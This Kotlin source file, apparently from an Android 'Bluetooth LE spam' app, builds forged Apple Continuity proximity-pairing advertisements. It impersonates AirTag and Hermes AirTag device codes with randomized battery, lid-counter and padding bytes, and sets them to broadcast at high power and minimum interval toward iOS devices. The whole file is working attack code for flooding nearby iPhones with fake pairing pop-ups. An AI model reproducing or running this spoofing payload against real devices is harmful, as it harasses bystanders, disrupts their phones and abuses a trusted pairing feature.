package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers.Companion.toHexString
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData
import kotlin.random.Random

class ContinuityNewAirtagPopUpAdvertisementSetGenerator: IAdvertisementSetGenerator {

    private val _logTag = "ContinuityNewAirtagPopUpAdvertisementSetGenerator"
    private val _manufacturerId = 76 // 0x004c == 76 = Apple

    val deviceData = mapOf(
        "0055" to "Airtag",
        "0030" to "Hermes Airtag",
    )

    val colors_white = mapOf(
        "00" to "White"
    )

    val deviceColorsMap = mapOf(
        "0055" to colors_white,
        "0030" to colors_white,
    )

    private fun getColorMap(deviceIdentifier: String):Map<String,String>{
        deviceColorsMap.forEach{
            if(it.key == deviceIdentifier){
                return it.value
            }
        }

        return mapOf()
    }

    companion object {
        fun getRandomBudsBatteryLevel():String{
            val level = ((0..9).random() shl 4) + (0..9).random()
            return StringHelpers.intToHexString(level)
        }

        fun getRandomChargingCaseBatteryLevel():String{
            var level = ((Random.nextInt(8) % 8) shl 4) + (Random.nextInt(10) % 10)
            return StringHelpers.intToHexString(level)
        }

        fun getRandomLidOpenCounter():String{
            var counter =  Random.nextInt(256)
            return StringHelpers.intToHexString(counter)
        }

        fun prepareAdvertisementSet(advertisementSet: AdvertisementSet):AdvertisementSet{

            if(advertisementSet.advertiseData.manufacturerData.size > 0){
                var payload = advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData

                // randomize random data

                /*
                var payload =
                            0 continuityType +
                            1 payloadSize +
                            2 prefix.key +
                            3 - 4 deviceData.key +
                            5 status +
                            6 getRandomBudsBatteryLevel() +
                            7 getRandomChargingCaseBatteryLevel() +
                            8 getRandomLidOpenCounter() +
                            9 color.key +
                            10 "00"*/

                //payload += Random.nextBytes(16).toHexString()

                payload[6] = StringHelpers.decodeHex(getRandomBudsBatteryLevel())[0]
                payload[7] = StringHelpers.decodeHex(getRandomChargingCaseBatteryLevel())[0]
                payload[8] = StringHelpers.decodeHex(getRandomLidOpenCounter())[0]

                for (i in 11..26) {
                    payload[i] = Random.nextBytes(1)[0]
                }

            }

            return advertisementSet
        }
    }

    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: deviceData

        data.forEach{deviceData ->
            val colorMap = getColorMap(deviceData.key)
            val prefix = "05" // => NEW AIRTAG

                colorMap.forEach{ color ->

                    var advertisementSet = AdvertisementSet()
                    advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
                    advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_NEW_AIRTAG
                    advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE

                    // Advertise Settings
                    advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
                    advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
                    advertisementSet.advertiseSettings.connectable = false
                    advertisementSet.advertiseSettings.timeout = 0

                    // Advertising Parameters
                    advertisementSet.advertisingSetParameters.legacyMode = true
                    advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
                    advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
                    // Phy is only used in non Legacy Mode
                    advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_CODED
                    advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_CODED
                    advertisementSet.advertisingSetParameters.scanable = true
                    advertisementSet.advertisingSetParameters.connectable = false

                    // AdvertiseData
                    advertisementSet.advertiseData.includeDeviceName = false

                    val manufacturerSpecificData = ManufacturerSpecificData()
                    manufacturerSpecificData.manufacturerId = _manufacturerId

                    var continuityType = "07" // 0x07 = ProximityPair
                    var payloadSize = "19" // 0x19 => 25
                    val status = "55"

                    var payload =
                        continuityType +
                        payloadSize +
                        prefix +
                        deviceData.key +
                        status +
                        getRandomBudsBatteryLevel() +
                        getRandomChargingCaseBatteryLevel() +
                        getRandomLidOpenCounter() +
                        color.key +
                        "00"
                    
                    // ADD 16 Random Bytes
                    payload += Random.nextBytes(16).toHexString()

                    // Airpods Example
                    //071907022075aa3001000045121212000000000000000000000000

                    //Log.d(_logTag, "Payload: " + payload)
                    manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(payload)

                    advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
                    advertisementSet.advertiseData.includeTxPower = false

                    // Scan Response
                    //advertisementSet.scanResponse.includeTxPower = false

                    // General Data
                    advertisementSet.title = "New " + deviceData.value + " " + color.value

                    // Callbacks
                    advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
                    advertisementSet.advertisingCallback = GenericAdvertisingCallback()

                    advertisementSets.add(advertisementSet)

                }
        }

        return advertisementSets.toList()
    }

}